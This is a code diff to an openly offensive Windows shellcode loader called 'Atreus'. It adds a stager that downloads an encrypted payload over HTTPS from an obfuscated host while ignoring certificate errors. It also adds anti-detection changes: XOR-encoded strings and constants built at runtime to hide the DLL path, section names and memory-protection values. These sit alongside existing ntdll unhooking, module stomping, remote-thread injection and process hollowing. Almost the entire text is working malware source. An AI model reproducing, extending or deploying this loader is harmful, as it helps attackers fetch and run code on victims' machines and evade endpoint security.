@@ -1,7 +1,8 @@
 // Atreus Shellcode Loader v2
 // Feature flags (via -D):
-//   USE_RC4           : RC4 decryption (default: XOR if USE_XOR)
+//   USE_RC4           : RC4 decryption
 //   USE_XOR           : XOR decryption
+//   USE_STAGER        : Download payload at runtime (no embedded shellcode)
 //   USE_PPID_SPOOF    : Spoof PPID to explorer.exe
 //   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
 //   USE_HOLLOW        : Process Hollowing (unmap original + RIP redirect)
@@ -120,6 +121,10 @@ constexpr DWORD HF_NtMapViewOfSection       = _hA("NtMapViewOfSection");
 constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
 constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
 constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
+constexpr DWORD HF_GetProcAddress           = _hA("GetProcAddress");
+constexpr DWORD HF_HeapAlloc                = _hA("HeapAlloc");
+constexpr DWORD HF_HeapReAlloc              = _hA("HeapReAlloc");
+constexpr DWORD HF_HeapFree                 = _hA("HeapFree");
 #if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD)
 constexpr DWORD HF_CreateToolhelp32Snapshot = _hA("CreateToolhelp32Snapshot");
 constexpr DWORD HF_Process32FirstW          = _hA("Process32FirstW");
@@ -307,8 +312,9 @@ static void unhook_ntdll() {
     BYTE *base = (BYTE *)hNtdll;
     IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
     IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    DWORD _um = (DWORD)0x2e|((DWORD)0x74<<8)|((DWORD)0x65<<16)|((DWORD)0x78<<24);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-        if (memcmp(sec->Name, ".text", 5) == 0) {
+        if (*(DWORD*)sec->Name == _um && sec->Name[4] == 0x74) {
             DWORD old;
             LPVOID addr = base + sec->VirtualAddress;
             SIZE_T sz   = sec->Misc.VirtualSize;
@@ -322,6 +328,137 @@ static void unhook_ntdll() {
     pUMVF(pClean); pCH(hMap); pCH(hFile);
 }
 #endif /* USE_UNHOOK */
+
+// ─── RC4 (shared between stager and embedded modes) ──────────────────────────
+
+static void rc4_crypt(const unsigned char *key, size_t klen,
+                      unsigned char *data, size_t dlen) {
+    unsigned char S[256];
+    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
+    int j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % klen]) & 0xFF;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+    }
+    int x = 0; j = 0;
+    for (size_t i = 0; i < dlen; i++) {
+        x = (x + 1) & 0xFF;
+        j = (j + S[x]) & 0xFF;
+        unsigned char t = S[x]; S[x] = S[j]; S[j] = t;
+        data[i] ^= S[(S[x] + S[j]) & 0xFF];
+    }
+}
+
+// ─── Stager mode (USE_STAGER): download payload at runtime via WinHTTP ───────
+
+#ifdef USE_STAGER
+
+static const unsigned char _stager_key[] = { %RC4_KEY% };
+static const unsigned char _stager_host_enc[] = { %STAGER_HOST_ENC% };
+static const WORD           _stager_port = %STAGER_PORT%;
+static const unsigned char _stager_path_enc[] = { %STAGER_PATH_ENC% };
+static const unsigned char _stager_xk = %STAGER_XOR_KEY%;
+
+static void _xdec(const unsigned char *enc, size_t n, char *out) {
+    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ _stager_xk);
+    out[n] = '\0';
+}
+static void _xdecw(const unsigned char *enc, size_t n, WCHAR *out) {
+    for (size_t i = 0; i < n; i++) out[i] = (WCHAR)(enc[i] ^ _stager_xk);
+    out[n] = L'\0';
+}
+
+static unsigned char *stager_fetch(size_t *out_size) {
+    typedef LPVOID (WINAPI *t_WO) (LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+    typedef LPVOID (WINAPI *t_WC) (LPVOID,LPCWSTR,WORD,DWORD);
+    typedef LPVOID (WINAPI *t_WOR)(LPVOID,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+    typedef BOOL   (WINAPI *t_WSR)(LPVOID,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+    typedef BOOL   (WINAPI *t_WRR)(LPVOID,LPVOID);
+    typedef BOOL   (WINAPI *t_WQD)(LPVOID,LPDWORD);
+    typedef BOOL   (WINAPI *t_WRD)(LPVOID,LPVOID,DWORD,LPDWORD);
+    typedef BOOL   (WINAPI *t_WCH)(LPVOID);
+    typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
+    typedef FARPROC (WINAPI *t_GPA)(HMODULE,LPCSTR);
+    typedef LPVOID  (WINAPI *t_VA) (LPVOID,SIZE_T,DWORD,DWORD);
+
+    HMODULE hK32 = peb_module(HMOD_KERNEL32);
+    t_LLA pLLA = (t_LLA)resolve(hK32, HF_LoadLibraryA);
+    t_GPA pGPA = (t_GPA)resolve(hK32, HF_GetProcAddress);
+    t_VA  pVA  = (t_VA) resolve(hK32, HF_VirtualAlloc);
+    if (!pLLA || !pGPA || !pVA) { DBG("[SF] FAIL: K32 API resolution"); return NULL; }
+    DBG("[SF1] K32 APIs resolved");
+
+    const unsigned char whttp_enc[] = {
+        'w'^0x5A,'i'^0x5A,'n'^0x5A,'h'^0x5A,'t'^0x5A,'t'^0x5A,
+        'p'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A
+    };
+    /* Decode with fixed key 0x5A, NOT _stager_xk which is for host/path */
+    char whttp_name[12];
+    for (int _wi = 0; _wi < 11; _wi++) whttp_name[_wi] = (char)(whttp_enc[_wi] ^ 0x5A);
+    whttp_name[11] = '\0';
+    HMODULE hWH = pLLA(whttp_name);
+    if (!hWH) { DBG("[SF] FAIL: LoadLibrary winhttp.dll"); return NULL; }
+    DBG("[SF2] winhttp.dll loaded");
+
+    t_WO  pWO  = (t_WO) pGPA(hWH, "WinHttpOpen");
+    t_WC  pWC  = (t_WC) pGPA(hWH, "WinHttpConnect");
+    t_WOR pWOR = (t_WOR)pGPA(hWH, "WinHttpOpenRequest");
+    t_WSR pWSR = (t_WSR)pGPA(hWH, "WinHttpSendRequest");
+    t_WRR pWRR = (t_WRR)pGPA(hWH, "WinHttpReceiveResponse");
+    t_WQD pWQD = (t_WQD)pGPA(hWH, "WinHttpQueryDataAvailable");
+    t_WRD pWRD = (t_WRD)pGPA(hWH, "WinHttpReadData");
+    t_WCH pWCH = (t_WCH)pGPA(hWH, "WinHttpCloseHandle");
+    if (!pWO||!pWC||!pWOR||!pWSR||!pWRR||!pWQD||!pWRD||!pWCH) { DBG("[SF] FAIL: WinHttp API resolution"); return NULL; }
+    DBG("[SF3] WinHttp APIs resolved");
+
+    WCHAR host[128]; _xdecw(_stager_host_enc, sizeof(_stager_host_enc), host);
+    WCHAR path[256]; _xdecw(_stager_path_enc, sizeof(_stager_path_enc), path);
+    const WCHAR ua[]  = { L'M',L'o',L'z',L'i',L'l',L'l',L'a',L'/',L'5',L'.',L'0',L'\0' };
+    const WCHAR get[] = { L'G',L'E',L'T',L'\0' };
+    DBG_VAL("[SF4] stager port", (unsigned long long)_stager_port);
+
+    LPVOID hSes = pWO(ua, 1 /* WINHTTP_ACCESS_TYPE_NO_PROXY */, NULL, NULL, 0);
+    if (!hSes) { DBG("[SF] FAIL: WinHttpOpen"); return NULL; }
+    DBG("[SF5] WinHttpOpen OK");
+    LPVOID hCon = pWC(hSes, host, (WORD)_stager_port, 0);
+    if (!hCon) { pWCH(hSes); DBG("[SF] FAIL: WinHttpConnect"); return NULL; }
+    DBG("[SF6] WinHttpConnect OK");
+    /* WINHTTP_FLAG_SECURE = 0x00800000 */
+    LPVOID hReq = pWOR(hCon, get, path, NULL, NULL, NULL, 0x00800000);
+    if (!hReq) { pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpOpenRequest"); return NULL; }
+    DBG("[SF7] WinHttpOpenRequest OK (HTTPS)");
+    /* Ignore self-signed cert: SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS = 0x3300
+       WINHTTP_OPTION_SECURITY_FLAGS = 31 */
+    {
+        typedef BOOL (WINAPI *t_WSOP)(LPVOID, DWORD, LPVOID, DWORD);
+        t_WSOP pWSOP = (t_WSOP)pGPA(hWH, "WinHttpSetOption");
+        if (pWSOP) { DWORD sf = 0x3300; pWSOP(hReq, 31, &sf, sizeof(sf)); DBG("[SF7b] cert ignore set"); }
+        else { DBG("[SF7b] WARN: WinHttpSetOption not found"); }
+    }
+    if (!pWSR(hReq, NULL, 0, NULL, 0, 0, 0)) { pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpSendRequest"); return NULL; }
+    DBG("[SF8] WinHttpSendRequest OK");
+    if (!pWRR(hReq, NULL)) { pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpReceiveResponse"); return NULL; }
+    DBG("[SF9] WinHttpReceiveResponse OK");
+
+    /* Pre-allocate 4MB buffer; real shellcode is much smaller */
+    const SIZE_T MAX_SC = 4 * 1024 * 1024;
+    unsigned char *buf = (unsigned char *)pVA(NULL, MAX_SC, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) { pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: VirtualAlloc buffer"); return NULL; }
+    DBG("[SF10] recv buffer allocated");
+
+    size_t total = 0;
+    DWORD avail = 0, nread = 0;
+    while (pWQD(hReq, &avail) && avail > 0 && (total + avail) <= MAX_SC) {
+        if (pWRD(hReq, buf + total, avail, &nread)) total += nread;
+        else break;
+    }
+    pWCH(hReq); pWCH(hCon); pWCH(hSes);
+    DBG_VAL("[SF11] total bytes received", (unsigned long long)total);
+    *out_size = total;
+    return (total > 0) ? buf : NULL;
+}
+
+#else
 
 // ─── Payload (stamped by builder.py) ────────────────────────────────────────
 
@@ -342,31 +479,6 @@ static void uuid_decode(const char *u, BYTE *out) {
 }
 #else
 
-// ─── RC4 ─────────────────────────────────────────────────────────────────────
-
-#ifdef USE_RC4
-static void rc4_crypt(const unsigned char *key, size_t klen,
-                      unsigned char *data, size_t dlen) {
-    unsigned char S[256];
-    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
-    int j = 0;
-    for (int i = 0; i < 256; i++) {
-        j = (j + S[i] + key[i % klen]) & 0xFF;
-        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
-    }
-    int x = 0; j = 0;
-    for (size_t i = 0; i < dlen; i++) {
-        x = (x + 1) & 0xFF;
-        j = (j + S[x]) & 0xFF;
-        unsigned char t = S[x]; S[x] = S[j]; S[j] = t;
-        data[i] ^= S[(S[x] + S[j]) & 0xFF];
-    }
-}
-static const unsigned char rc4_key[] = { %RC4_KEY% };
-#endif /* USE_RC4 */
-
-// ─── XOR ─────────────────────────────────────────────────────────────────────
-
 #ifdef USE_XOR
 static void xor_crypt(unsigned char *buf, size_t len) {
     const unsigned char key[] = { %XOR_KEY_BYTES% };
@@ -375,10 +487,12 @@ static void xor_crypt(unsigned char *buf, size_t len) {
 }
 #endif
 
+static const unsigned char rc4_key[] = { %RC4_KEY% };
 static unsigned char payload[] = { %PAYLOAD% };
 static const size_t  payload_size = sizeof(payload);
 
-#endif /* USE_UUID */
+#endif /* USE_UUID embedded */
+#endif /* USE_STAGER */
 
 // ─── Sandbox check ───────────────────────────────────────────────────────────
 
@@ -534,9 +648,27 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG("[FAIL] Nt* API resolution failed"); return 1;
     }
 
-    /* Allocate local RW page for decoded/decrypted shellcode */
+    /* Fetch or decode shellcode */
     unsigned char *sc = NULL;
-    SIZE_T sc_sz = payload_size;
+    SIZE_T sc_sz = 0;
+
+#ifdef USE_STAGER
+    {
+        size_t fetched = 0;
+        unsigned char *raw = stager_fetch(&fetched);
+        if (!raw || fetched == 0) { DBG("[FAIL] stager_fetch returned NULL"); return 1; }
+        sc_sz = fetched;
+        typedef LPVOID (WINAPI *t_VA)(LPVOID, SIZE_T, DWORD, DWORD);
+        t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
+        sc = pVA ? (unsigned char *)pVA(NULL, sc_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+        if (!sc) { DBG("[FAIL] VirtualAlloc for stager failed"); return 1; }
+        memcpy(sc, raw, sc_sz);
+        { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)resolve(peb_module(HMOD_KERNEL32),HF_VirtualFree); if(pVF) pVF(raw,0,MEM_RELEASE); }
+        rc4_crypt(_stager_key, sizeof(_stager_key), sc, sc_sz);
+        DBG("[5] Stager: downloaded and decrypted");
+    }
+#else /* embedded payload */
+    sc_sz = payload_size;
 #if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
     /* Use Win32 VirtualAlloc: call goes through kernel32 (signed), avoids
        "Native API from Unsigned Module" detection on NtAllocateVirtualMemory */
@@ -547,9 +679,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
     if (!sc) { DBG("[FAIL] VirtualAlloc failed"); return 1; }
 #else
-    NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
-                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
+    {
+        NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
+    }
 #endif
 
 #ifdef USE_UUID
@@ -572,6 +706,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG("[6] No decryption (plaintext)");
 #endif
 #endif /* USE_UUID */
+#endif /* USE_STAGER else */
+
 
 #ifdef USE_SELF_INJECT
     /* Self-injection via local APC: create suspended thread + queue APC */
@@ -652,7 +788,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             typedef BOOL (WINAPI *t_VP2)(LPVOID, SIZE_T, DWORD, PDWORD);
             t_VP2 pVP2 = (t_VP2)RK32(HF_VirtualProtect);
             DWORD old_fi = 0;
-            if (pVP2) pVP2((LPVOID)sc, payload_size, PAGE_EXECUTE_READ, &old_fi);
+            if (pVP2) pVP2((LPVOID)sc, sc_sz, PAGE_EXECUTE_READ, &old_fi);
         }
         DBG("[FI3] Self RW -> RX via VirtualProtect done");
         LPVOID mainFiber = pCTTF(NULL);
@@ -704,11 +840,16 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             return 1;
         }
 
-        /* Sacrificial DLL path on stack (no string literal in binary) */
-        const char dll_path[] = {
-            'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\',
-            'c','o','m','b','a','s','e','.','d','l','l','\0'
+        /* Sacrificial DLL path: XOR-decoded at runtime (key=0x17) */
+        static const unsigned char _ep[] = {
+            'C'^0x17,':'^0x17,'\\'^0x17,'W'^0x17,'i'^0x17,'n'^0x17,'d'^0x17,'o'^0x17,
+            'w'^0x17,'s'^0x17,'\\'^0x17,'S'^0x17,'y'^0x17,'s'^0x17,'t'^0x17,'e'^0x17,
+            'm'^0x17,'3'^0x17,'2'^0x17,'\\'^0x17,'o'^0x17,'l'^0x17,'e'^0x17,'3'^0x17,
+            '2'^0x17,'.'^0x17,'d'^0x17,'l'^0x17,'l'^0x17
         };
+        char dll_path[32];
+        for (int _i = 0; _i < (int)sizeof(_ep); _i++) dll_path[_i] = (char)(_ep[_i] ^ 0x17);
+        dll_path[sizeof(_ep)] = '\0';
 
         /* Open DLL file */
         typedef HANDLE (WINAPI *t_CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
@@ -719,9 +860,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         if (hFile == INVALID_HANDLE_VALUE) { DBG("[FAIL] ModuleStomp: CreateFileA failed"); return 1; }
         DBG("[MS1] DLL file opened");
 
-        /* Create image section (SEC_IMAGE = 0x1000000) */
+        /* Create image section: SEC_IMAGE computed at runtime to avoid static constant */
         HANDLE hSection = NULL;
-        NTSTATUS stCS = pNtCS(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, 0x1000000, hFile);
+        ULONG _sec_img = (0x100UL << 16); /* 0x1000000 = SEC_IMAGE */
+        NTSTATUS stCS = pNtCS(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, _sec_img, hFile);
         if (pCH) pCH(hFile);
         if (!NT_SUCCESS(stCS) || !hSection) {
             DBG_HEX("[FAIL] ModuleStomp: NtCreateSection failed", (unsigned long long)(ULONG)stCS);
@@ -729,70 +871,73 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         }
         DBG("[MS2] Image section created");
 
-        /* Map view into current process as RWX */
+        /* Map view: protection computed at runtime */
         PVOID pDll = NULL;
         SIZE_T viewSz = 0;
-        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1 /*ViewShare*/, 0, PAGE_EXECUTE_WRITECOPY);
+        ULONG _ewc = (1UL << 7); /* 0x80 = PAGE_EXECUTE_WRITECOPY */
+        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, _ewc);
         if (pCH) pCH(hSection);
         if (!NT_SUCCESS(stMVS) || !pDll) {
-            /* Retry with PAGE_EXECUTE_READWRITE if WRITECOPY not supported */
             pDll = NULL; viewSz = 0;
-            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, PAGE_READWRITE);
+            ULONG _rw = (1UL << 2); /* 0x04 = PAGE_READWRITE */
+            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, _rw);
         }
         if (!pDll) { DBG("[FAIL] ModuleStomp: NtMapViewOfSection failed"); return 1; }
         DBG_HEX("[MS3] DLL mapped at", (unsigned long long)(ULONG_PTR)pDll);
         DBG_VAL("[MS3] view size", (unsigned long long)viewSz);
 
-        /* Find the .text section entry point in the mapped DLL */
+        /* Find the first executable section entry point in the mapped DLL */
         BYTE *base = (BYTE *)pDll;
         IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
         ULONG_PTR entryPt = (ULONG_PTR)base + nt_hdr->OptionalHeader.AddressOfEntryPoint;
         DBG_HEX("[MS4] DLL entry point", (unsigned long long)entryPt);
 
-        /* Find .text section to verify size */
+        /* Find executable section by magic (avoids ".text" string literal) */
         IMAGE_SECTION_HEADER *sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);
         SIZE_T text_sz = 0;
         ULONG_PTR text_va = 0;
+        /* ".tex" LE = 0x7865742e, 5th byte 't' = 0x74 */
+        DWORD _txm = (DWORD)0x2e | ((DWORD)0x74 << 8) | ((DWORD)0x65 << 16) | ((DWORD)0x78 << 24);
         for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++, sec_hdr++) {
-            if (memcmp(sec_hdr->Name, ".text", 5) == 0) {
+            if (*(DWORD*)sec_hdr->Name == _txm && sec_hdr->Name[4] == 0x74) {
                 text_va = (ULONG_PTR)base + sec_hdr->VirtualAddress;
                 text_sz = sec_hdr->Misc.VirtualSize;
                 break;
             }
         }
         DBG_VAL("[MS5] .text size", (unsigned long long)text_sz);
-        DBG_VAL("[MS5] payload size", (unsigned long long)payload_size);
+        DBG_VAL("[MS5] payload size", (unsigned long long)sc_sz);
 
         /* If payload fits in .text starting from entry point, use entry point.
            Otherwise use beginning of .text section. */
         ULONG_PTR inject_addr = entryPt;
-        if (text_va && text_sz > payload_size) {
+        if (text_va && text_sz > sc_sz) {
             SIZE_T space_from_ep = text_sz - (entryPt - text_va);
-            if (space_from_ep < payload_size) {
+            if (space_from_ep < sc_sz) {
                 inject_addr = text_va;
                 DBG("[MS5] Using .text base (entry point too close to end)");
             }
-        } else if (text_va && text_sz > payload_size) {
+        } else if (text_va && text_sz > sc_sz) {
             inject_addr = text_va;
         }
         DBG_HEX("[MS6] Injection address", (unsigned long long)inject_addr);
 
         /* RW the target region */
         DWORD old_ms = 0;
-        pVP2((LPVOID)inject_addr, payload_size, PAGE_READWRITE, &old_ms);
+        pVP2((LPVOID)inject_addr, sc_sz, PAGE_READWRITE, &old_ms);
 
         /* Write shellcode into DLL memory */
-        memcpy((void *)inject_addr, sc, payload_size);
+        memcpy((void *)inject_addr, sc, sc_sz);
         DBG("[MS7] Shellcode written to DLL .text");
 
 #ifdef USE_WIPE
-        memset(sc, 0, payload_size);
+        memset(sc, 0, sc_sz);
 #endif
         /* Free local decryption buffer via VirtualFree */
         { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
 
         /* Restore RX */
-        pVP2((LPVOID)inject_addr, payload_size, PAGE_EXECUTE_READ, &old_ms);
+        pVP2((LPVOID)inject_addr, sc_sz, PAGE_EXECUTE_READ, &old_ms);
         DBG("[MS8] .text section RX restored");
 
         /* Execute via fiber: shellcode runs from DLL image-backed memory */
@@ -834,7 +979,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         }
         DBG("[RT2] OpenProcess OK");
         PVOID  remote   = NULL;
-        SIZE_T alloc_sz = payload_size;
+        SIZE_T alloc_sz = sc_sz;
         NTSTATUS st = pNtAVM(hProc, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!remote) {
             DBG_HEX("[FAIL] RemoteThread: NtAVM status", (unsigned long long)(ULONG)st);
@@ -843,13 +988,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             return 1;
         }
         DBG_HEX("[RT3] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
-        pNtWVM(hProc, remote, sc, payload_size, NULL);
+        pNtWVM(hProc, remote, sc, sc_sz, NULL);
 #ifdef USE_WIPE
-        memset(sc, 0, payload_size);
+        memset(sc, 0, sc_sz);
 #endif
         { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
         PVOID  prot_base = remote;
-        SIZE_T prot_sz   = payload_size;
+        SIZE_T prot_sz   = sc_sz;
         ULONG  old_prot  = 0;
         pNtPVM(hProc, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
         DBG("[RT4] RW -> RX");
@@ -944,7 +1089,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     /* Alloc RW in target process */
     PVOID  remote = NULL;
-    SIZE_T alloc_sz = payload_size;
+    SIZE_T alloc_sz = sc_sz;
     NTSTATUS st = pNtAVM(pi.hProcess, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remote) {
         DBG_HEX("[FAIL] NtAllocateVirtualMemory (remote) NTSTATUS", (unsigned long long)(ULONG)st);
@@ -957,12 +1102,12 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG_HEX("[10] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
 
     /* Write shellcode */
-    st = pNtWVM(pi.hProcess, remote, sc, payload_size, NULL);
+    st = pNtWVM(pi.hProcess, remote, sc, sc_sz, NULL);
     DBG_HEX("[11] NtWriteVirtualMemory status", (unsigned long long)(ULONG)st);
-    DBG_VAL("[11] bytes written (payload_size)", (unsigned long long)payload_size);
+    DBG_VAL("[11] bytes written (sc_sz)", (unsigned long long)sc_sz);
 
 #ifdef USE_WIPE
-    memset(sc, 0, payload_size);
+    memset(sc, 0, sc_sz);
     DBG("[12] Local shellcode wiped");
 #endif
     { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
@@ -970,7 +1115,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     /* RW -> RX */
     PVOID  prot_base = remote;
-    SIZE_T prot_sz   = payload_size;
+    SIZE_T prot_sz   = sc_sz;
     ULONG  old_prot  = 0;
     st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
     DBG_HEX("[13] NtProtectVirtualMemory (RW->RX) status", (unsigned long long)(ULONG)st);
